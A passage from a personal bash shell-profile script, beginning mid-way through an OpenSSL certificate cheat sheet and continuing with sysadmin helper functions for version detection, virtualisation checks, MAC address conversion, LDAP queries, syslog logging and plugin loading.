openssl req -new -newkey rsa:2048 -nodes -out domain.csr -subj "/C=CH/ST=Switzerland/L=Zurich/O=itop/OU=itop dev/CN=itop.com"
openssl req -new -key private.key -nodes -out domain.csr -subj "/C=CH/ST=Switzerland/L=Zurich/O=itop/OU=itop dev/CN=itop.com"

# create private Key:
# if you dont want a password remove aes128/des3 but this can cause incompatibilitys!
openssl genrsa -aes128 -out privkey.pem 2048
openssl gendsa -des3 -out privkey.pem dsaparam.pem


### find software using ssl
lsof | grep libssl


### decode crt, csr, pkcs12
openssl x509 -noout -text -in domain.crt
openssl x509 -noout -purpose  -in domain.crt
openssl req  -noout -text -in mycsr.csr
openssl pkcs12 -info -in keyStore.p12


### convert crt, der, pem, etc.
openssl x509  -in mycert.crt -outform PEM -out mycert.pem
openssl x509  -in mycert.cer -inform DER  -out mycert.pem
openssl x509  -in domain.crt -inform DER  -out mycert.pem  -outform PEM
openssl pkcs8 -in key.crt -topk8 -nocrypt -out certificatename.pk8
#Convert a PEM certificate file and a private key to PKCS#12 (.pfx .p12)
openssl pkcs12 -export -out certificate.pfx -inkey privateKey.key -in certificate.crt -certfile CACert.crt

### veryfiy chain
openssl verify -verbose -CAfile cacert.crt test.crt
### check rsa-key
openssl rsa -check -in
### verify
openssl x509 -noout -modulus -in server.crt | openssl md5
openssl rsa -noout -modulus -in server.key | openssl md5
openssl req -noout -modulus -in server.csr | openssl md5

EOF
}

######################################################################################## _SEC: OTHER FUNCTIONS
########################################################################################
########################################################################################

#d#==head2 var : find tools and their version
#d#
#d# Would be NICE for OWN/SPECIAL services, tools, etc.
#d# so we sort for key (tool) but maybe add some categorys (just by prefix "lang_java")
#d#
declare -A kprofile_var_array;
function var() {
  local ver verstr;
  if [ "$kprofile_var_array_set" != 1 ] || [ "$1" == "-f" ]; then
    echo "scanning:"
    if which java 2>&1 >/dev/null; then
      verstr=$(java -version 2>&1|head -n 1)
      kprofile_var_array[lang_java]="$verstr";
    fi
    if which php 2>&1 >/dev/null; then
      verstr=($(php --version 2>&1 |head -n 1));
      kprofile_var_array[lang_php]="${verstr[1]}";
    fi
    if which perl 2>&1 >/dev/null; then
      verstr=$(perl -e "print $]" 2>&1);
      kprofile_var_array[lang_perl]="${verstr}]";
    fi
    if which python 2>&1 >/dev/null; then
      verstr=($(python --version 2>&1));
      kprofile_var_array[lang_python]="${verstr[1]}";
    fi
    if which gcc 2>&1 >/dev/null; then
      verstr=($(gcc -v 2>&1|tail -n 1));
      kprofile_var_array[lang_gcc]="${verstr[2]}";
    fi
    if which xl 2>&1 >/dev/null; then
      verstr=($(xl info  2>&1|grep release ));
      kprofile_var_array[system_xl]="${verstr[2]}";
    fi
    if which mdadm 2>&1 >/dev/null; then
      verstr=($(mdadm --version 2>&1|tail -n 1));
      kprofile_var_array[disk_mdadm]="${verstr[2]}";
    fi
    if which drbdadm 2>&1 >/dev/null; then
      eval "$(drbdadm --version)"
      kprofile_var_array[disk_drbdadm]="$DRBDADM_VERSION";
    fi
    if which httpd 2>&1 >/dev/null; then
      verstr="$(httpd -v |head -n 1)"
      kprofile_var_array[srv_httpd]="${verstr}";
    fi
    if [ -d /opt/fhem ]; then
      kprofile_var_array[atom_fhem]="0";
    fi
  fi
  kprofile_var_array_set=1;
  content=$(for ver in "${!kprofile_var_array[@]}"; do
    echo "$ver ${kprofile_var_array[$ver]}"
  done;);
  echo "$content"|sort
}


#d#==head2 _v_detect :
#d#
function _v_detect {
  cpuid=$(cat /proc/cpuinfo |grep "model name" |head -n 1)
  if [ "$cpuid" == "XenVMMXenVMM" ]; then
    EENV_VIRT="[xen]"; return
  fi

  if [ "$USER" == "root" ] && [ -x /usr/sbin/virt-what ]; then
    EENV_VIRT=$(/usr/sbin/virt-what)
    if [[ "$EENV_VIRT" =~ dom0 ]]; then
      EENV_VIRT="[xen-dom0]"; return;
    fi
  fi
  if [ -d "${root}/proc/xen" ]; then
    EENV_VIRT="[xen]";
    if grep -q "control_d" "${root}/proc/xen/capabilities" 2>/dev/null; then
      EENV_VIRT="[xen-dom0]";
    fi
# $EENV_VIRT
    return
  fi

  #elif [ -f "${root}/sys/hypervisor/type" ] && grep -q "xen" "${root}/sys/hypervisor/type"; then
  if [ -f "${root}/sys/hypervisor/type" ]; then
    EENV_VIRT="xen( $(cat ${root}/sys/hypervisor/type) )"; return;
  fi

  if grep -q 'QEMU' "${root}/proc/cpuinfo" >/dev/null; then
    EENV_VIRT="[qemu]"; return;
  fi

  if [ "$USER" == "root" ] && [ -x /usr/sbin/dmidecode ]; then
    if /usr/sbin/dmidecode >/dev/null 2>&1; then
      if /usr/sbin/dmidecode |grep "QEMU" >/dev/null; then
        EENV_VIRT="[qemu]"; return;
      fi
    fi
  fi

  if [ ! -z $FACTER_BIN ]; then
    v_virtual=$($FACTER_BIN virtual)
# virtual => xen0 , physical ,
    if [ "$v_virtual" == "physical" ]; then
      EENV_VIRT="[hardware]"; return;
    elif [ "$v_virtual" == "kvm" ]; then
      EENV_VIRT="[kvmvm]"; return;
    elif [ "$v_virtual" == "xen0" ]; then
      VM_RUNNING=$(/usr/bin/facter xendomains 2>/dev/null)
      EENV_VIRT="[xen-dom0]"; return;
      # xendomains => itldap2,itmysql2,itd2,itmail2,tentable
    else
      EENV_VIRT="[$v_virtual]"; return;
    fi
  fi

  if [ ! -z "$WT_SESSION" ]; then
    EENV_VIRT="[wt]"; return;
  fi
}

#if [ -z "$SSH_CONNECTION" ]; then
if [ "$SHELL_I" == "interactive" ]; then
  _v_detect
fi

#d#==head2 procinfo
#d#
function procinfo {
  PROCPID="$1"
  if [ -d /proc/$PROCPID ]; then
    echo "environ:"
    cat /proc/$PROCPID/environ 2>/dev/null| tr "\\000" "\n"
    echo -n "cmdline:"
    cat /proc/$PROCPID/cmdline 2>/dev/null| tr "\\000" " "
    ll /proc/$PROCPID/fd
    echo /proc/$PROCPID
  else
    echo "could not find /proc/$PROCPID";
  fi
}

#d#==head2 idg : id split by , and grep
#d#
function idg {
  user=$1; shift
  if [ -z "$1" ]; then
    id $user |sed 's/,/\n/g'
  else
    id $user |sed 's/,/\n/g' |grep $@
  fi
}

#d#==head2 v : virtualisation help
#d#
function v {
  command=$1; shift;
  if [ -z "$command" ]; then
    echo "virtual service management"
    v_detect
  elif [ "$command" == "stop" ]; then
    virsh destroy $@
  else
    virsh $command $@
  fi
}

#d#==head2 ldaph : ldap help
#d#
function ldaph() {
  cat <<'EOF'
declare -A config
config['basedn']="dc=localdomain,dc=de"
config['admindn']="cn=admin,dc=localdomain,dc=de"
config['password']="PASSWORD"
hostname="ldaps://itldap1.test";
filter="(aRecord=*)"
ldapsearch -LLL -x -H "$hostname" -D "${config['admindn']}" -w ${config['password']} -b "${config['basedn']}" -s sub "$filter" aRecord associatedDomain |less


# add schema
ldapadd -Y EXTERNAL -H ldapi:/// -f misc.ldif


EOF
}


#d#==head2 hp2mac : convert hp-mac-addres to normal mac
#d#
function bashhelp() {
  cat <<'EOF'
IFSOLD=$IFS
IFS=$'\n'
# regex with match
if [[ $var =~ (.*):(.*) ]]; then
  echo "${BASH_REMATCH[@]}"; # alle
  echo ${BASH_REMATCH[1]} # erstes !
fi

dir=${file%/*}  # match end, delete the shortest part that matches
filename=${file##*/} # match beginning, delete the longest part that matches

# to uppercase: ${A^^?}
# to lowercase:
${A,,?}
EOF
  echo "function(${FUNCNAME[0]}) line($LINENO)(${0})(${1})"
}

#d#==head2 hp2mac : convert hp-mac-addres to normal mac
#d#
function hp2mac() {
  STRING=$1
  CONV1=$(echo -n "$STRING"|cut -b 1-2; echo -n ":"; echo "$STRING"|cut -b 3-4; echo -n ":"; echo -n "$STRING"|cut -b 5-6; echo -n ":"; echo -n "$STRING"|cut -b 8-9; echo -n ":"; echo -n "$STRING"|cut -b 10-11; echo -n ":"; echo -n "$STRING"|cut -b 12-13)
  CONV2=$(echo "$CONV1"|tr -d "[:cntrl:]")
  NEW=$(echo "$CONV2"|tr '[:upper:]' '[:lower:]')
  #NEW=$(echo "$CONV2"|tr '[:lower:]' '[:upper:]')
  echo $NEW
}

#d#==head2 arpg : converting - to :
#d#
alias arpg="arp -n  |grep"

#d#==head2 macconv : converting - to :
#d#
function macconv() {
  STRING="$1"
  if [ ${#STRING} == 12 ]; then # 5C260A918954
    STRING=${STRING:0:2}:${STRING:2:2}:${STRING:4:2}:${STRING:6:2}:${STRING:8:2}:${STRING:10:2};
  fi
  if [ ${#STRING} == 14 ]; then # D067.E5B2.FF6E
    STRING=${STRING:0:2}:${STRING:2:2}:${STRING:5:2}:${STRING:7:2}:${STRING:10:2}:${STRING:12:2};
  fi
  if [ ${#STRING} == 13 ]; then # 5C260A:918954
    HP=$STRING
    STRING=${STRING:0:2}:${STRING:2:2}:${STRING:4:2}:${STRING:7:2}:${STRING:9:2}:${STRING:11:2};
  else
    HP=${STRING:0:2}${STRING:3:2}${STRING:6:2}:${STRING:9:2}${STRING:12:2}${STRING:15:2};
  fi
  STRING=$(echo -n $STRING|tr '[:upper:]' '[:lower:]')
  echo "mac-types:"
  PLAIN=$(echo "$STRING"|sed "s/[:-]//g")
  NEWCOLON=$(echo "$STRING"|sed "s/-/:/g")
  NEWDASH=$(echo "$STRING"|sed "s/:/-/g")
  DELL=$(echo "$HP"|sed "s/:/-/g")
  DELLNEW=${STRING:0:2}${STRING:3:2}:${STRING:6:2}${STRING:9:2}:${STRING:12:2}${STRING:15:2};
  DELLNEWDOT=${STRING:0:2}${STRING:3:2}.${STRING:6:2}${STRING:9:2}.${STRING:12:2}${STRING:15:2};
  DELLNEWDOT=$(echo -n $DELLNEWDOT|tr '[:lower:]' '[:upper:]' )
  #DELLNEW=$(echo "$PLAIN"|cut -b 1-4; echo ":" ; echo "$PLAIN"|cut -b 5-8; echo ":" ; echo "$PLAIN"|cut -b 9-12; )
  #DELLNEW=$(echo -n $DELLNEW|sed 's/ //g')
  echo " : $NEWCOLON"
  echo " - $NEWDASH"
  echo "HP $HP"
  echo "DELL $DELL"
  echo "DELLNEW $DELLNEW"
  echo "DELLNEW $DELLNEWDOT"
  echo "PLAIN $PLAIN"
}

#d#==head2 pssh : parallel-ssh helper script
#d# moved to kdesktop
#d#

#d#==head2 tarme : tar to an arciv
#d# @category : file,
#d#
function tarme() {
  local src=$1
  local dst=$2
  local current=$PWD
  if [ -d $src ]; then
    cd $src
  fi
  tar cfvz . $current/$dst |tee $current/$dst.txt
}

#d#==head2 logme : send message to syslog-host without using logger, just with nc
#d# @category : log
#d#
function logme() {
  local message="$@";
  echo "<14>$(hostname) $message" | nc -v -u -w 0 $PROFILE_LOGHOST 514
}

#d#==head2 jsonshow : use python (if aviable?) to format a json file
#d# @category : simplify
#d#
function jsonshow() {
  if [ ! -z $1 ]; then
    cat $1 | python -m json.tool
  else
    python -m json.tool
  fi
}

function yamlshow() {
  echo "install pyyaml for python3"
  if [ ! -z $1 ]; then
    python -c 'import yaml, sys; print(yaml.safe_load(sys.stdin))' < $1
  else
    python -c 'import yaml, sys; print(yaml.safe_load(sys.stdin))'
  fi
}

#d#==head2 : easy calculation
#d# @category : simplify
#d#
function b {
  echo "$@" | bc -l
}

#d#=head d : documentation
#d# @category : user
#d#
function d {
  mandir="/tmp";
  PROFILE_DOMAIN="$domain";
  if [ -z "$1" ]; then
    cat <<EOF
d \$file   : check if exists, otherwise create documentation and view doc
d c \$file : same as above, but force create
khelp     :
dporfile  :


  pod2man \$file
EOF
  else
    file=$1
    filename=${file##*/};
    man_file=$mandir/${filename}.man
    if [ "$file" == "c" ]; then
      shift;
      file=$1;
      rm $man_file;
    fi
    if [ "$2" == "c" ]; then
      rm $man_file;
    fi
    if [ ! -r $file ]; then
      file=$(which $file)
    fi
    if [ ! -r "$file" ]; then
      echo "could not find $1";
    else
      #extension=${file##*.};
      #if [ "$extension" == "sh" ]; then fi
      shbang=$(head -n 1 ${file});
      if [ ! -r $man_file ]; then
        if [[ "$shbang" =~ bash ]]; then
          echo "this is a bashfile, creating $man_file"
          #DATA=$(grep "^#d#" ${file} |cut -b 4-)
          DATA=$(grep "^#d#" ${file} |cut -b 5-)
          echo "$DATA" | pod2man -n "${file}" -c "${PROFILE_DOMAIN} shell script documentation" >$man_file;
          #echo "$DATA" ${man_file}.data;
        else
          echo "creating $man_file"
          pod2man $file >$man_file;
        fi
      fi
      manf $man_file;
    fi
  fi
}

#d#==head2 x = exit shell, check for running jobs and warn
#d#
#alias x='exit'
function x() {
  if [ "$TERM" == "screen" ]; then
	  exit
  fi
  JOBCOUNT=$(_jobcount)
  if [ "$JOBCOUNT" -gt 0 ]; then
    jobs
    echo "$JOBCOUNT jobs running, realy exit? [y]"
    REALY_EXIT=""
    while [[ "$REALY_EXIT" == "" ]]; do
      read REALY_EXIT
      if [[ "$REALY_EXIT" == "Y" ]] || [[ "$REALY_EXIT" == "y" ]]; then
        exit;
      fi
    done
    return
  fi
  #echo "exit"
  exit
}

#d#=head idd : user-information ( ssh, id, getent, etc. )
#d# @category : user
#d#
function idd() {
  echo "/etc/ssh/sshd_config AllowGroups:"
  cat /etc/ssh/sshd_config |grep AllowGroups
  echo "id:"
  id $1 |tr ',' "\n"
  echo "passwd:"
  local getent_passwd=$(getent passwd $1);
  local user_home=$(echo "$getent_passwd" |awk -F: '{ print $6 }');
  echo "ssh $user_home/.ssh:"
  ls -ld $user_home/.ssh
  ls -l  $user_home/.ssh/authorized_keys*
}

################################################################## python
#alias pyweb="python -m http.server 8000"
function pyweb() {
  if [ -z "$1" ]; then
    port="8000"
  else
    port="$1"
  fi
  if [ -x /usr/bin/python3 ]; then
    python3 -m http.server $port
  else
    python -m http.server $port
  fi
}




################################################################## load other "plugins" : END-PART

#d#==head2 load plugins
_plugins_skip="profile.disk"
if [ -r $PROFILE_SCRIPTDIR/profile.domain.sh ]; then . $PROFILE_SCRIPTDIR/profile.domain.sh; fi
for incfile in $(cd $PROFILE_SCRIPTDIR; ls profile.*.sh 2>/dev/null |grep -v domain ); do
  _skip_import=""
  for skip in $_plugins_skip; do
    if [ "$incfile" == "$skip" ]; then _skip_import=1; fi
  done
  if [ "$PROFILE_DEBUG" -gt 2 ]; then echo "($incfile)"; fi
  if [ "$_skip_import" != 1 ]; then
    . $PROFILE_SCRIPTDIR/$incfile;
  fi
done

################################################################## END-PART
#echo "start opts: $@"
while getopts "q:mhno" Option
do
  case $Option in
      m     ) echo "Scenario #1: option -m-   [OPTIND=${OPTIND}]";;
      h     ) echo "Scenario #1: option -h-   [OPTIND=${OPTIND}]";;
      n | o ) echo "Scenario #2: option -$Option-   [OPTIND=${OPTIND}]";;
      q     ) echo "Scenario #4: option -q-\
                  with argument \"$OPTARG\"   [OPTIND=${OPTIND}]";;
      *     ) echo "Unimplemented option chosen.";;   # Default.
  esac
done

if [ "$1" == "bash" ]; then
  bash -i
elif [ "$1" == "kenv" ]; then
  kenv
fi

# replace with something dynamic
determine-distribution # important for package-manager, etc.
#determine-network ?
determine-init
determine-logdaemon
determine-services

# if [ $# -gt 0 ]; then   $@ fi
## vim: noai:ts=2:sw=2:set expandtab:tw=200:nowrap:
